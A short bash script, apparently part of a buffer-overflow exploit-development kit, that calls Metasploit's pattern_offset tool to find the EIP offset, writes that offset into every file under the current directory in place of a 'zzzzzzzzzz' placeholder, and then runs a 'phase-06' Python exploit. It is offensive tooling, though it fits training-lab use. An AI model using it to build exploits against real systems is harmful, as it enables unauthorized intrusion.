#!/bin/bash
# Rapid Exploitation Creation Tool Menu by: Nick Lockard
echo "Rapid Exploitation Creation Tool"
    read -p 'Byte Size: ' bytes
    read -p 'EIP Register Overwritten Hex Byte Value: ' bytes2
    /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l $bytes -q $bytes2 > Raw-Total-AAAAs.txt
    grep "Exact match" Raw-Total-AAAAs.txt |cut -d" " -f6 > Total-AAAAs.txt
    for offbyte in $(cat Total-AAAAs.txt); do
    grep -rl 'zzzzzzzzzz' ./ |xargs sed -i "s/zzzzzzzzzz/$offbyte/g"
    echo "$offbyte is the total number of A's to lead with in order to reach EIP"
    echo "All weapons armed..." 
    done
python phase-06*
